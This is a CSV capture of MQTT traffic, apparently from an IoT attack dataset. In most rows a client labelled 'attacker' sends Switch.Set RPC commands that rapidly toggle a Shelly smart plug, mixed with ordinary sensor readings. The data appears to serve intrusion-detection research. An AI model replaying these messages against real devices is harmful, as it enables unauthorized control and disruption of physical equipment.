timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T15:47:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1756 31387.194 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31387.19,""swi"
2026-04-22T15:47:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1757 31387.210 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1758 31387.694 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:34,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T15:47:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31387.69,""swi"
2026-04-22T15:47:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1759 31387.713 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:34,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T15:47:35,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T15:47:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1760 31388.195 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:35,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T15:47:35,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T15:47:35,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T15:47:35,iot/dht11/sensor/humidity/state,2,39
2026-04-22T15:47:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31388.19,""swi"
2026-04-22T15:47:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1761 31388.211 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1762 31388.696 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31388.69,""swi"
2026-04-22T15:47:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1763 31388.715 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1764 31389.196 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31389.19,""swi"
2026-04-22T15:47:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1765 31389.212 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1766 31389.696 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31389.69,""swi"
2026-04-22T15:47:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1767 31389.715 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1768 31390.197 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31390.19,""swi"
2026-04-22T15:47:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1769 31390.213 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1770 31390.697 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31390.69,""swi"
2026-04-22T15:47:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1771 31390.715 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1772 31391.199 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31391.20,""swi"
2026-04-22T15:47:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1773 31391.217 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:38,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T15:47:38,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T15:47:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1774 31391.699 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31391.70,""swi"
2026-04-22T15:47:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1775 31391.718 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1776 31392.198 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31392.20,""swi"
2026-04-22T15:47:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1777 31392.215 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:39,iot/pir/binary_sensor/motion/state,2,ON
2026-04-22T15:47:39,iot/pir/debug,49,[0;36m[D][binary_sensor:048]: 'Motion' >> ON[0m
2026-04-22T15:47:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1778 31392.700 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31392.70,""swi"
2026-04-22T15:47:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1779 31392.718 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1780 31393.200 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31393.20,""swi"
2026-04-22T15:47:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1781 31393.218 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1782 31393.704 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31393.70,""swi"
2026-04-22T15:47:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1783 31393.723 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1784 31394.200 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31394.20,""swi"
2026-04-22T15:47:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1785 31394.217 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1786 31394.701 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31394.70,""swi"
2026-04-22T15:47:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1787 31394.720 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1788 31395.204 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31395.20,""swi"
2026-04-22T15:47:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1789 31395.221 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T15:47:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T15:47:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1790 31395.705 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T15:47:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31395.70,""swi"
2026-04-22T15:47:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 1791 31395.724 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T15:47:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T15:47:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T15:47:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 1792 31396.206 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T15:47:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":233.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T15:47:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":31396.20,""swi"
2026-04-22T15:47:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 1793 31396.222 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T15:47:43,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T15:47:43,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T15:47:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
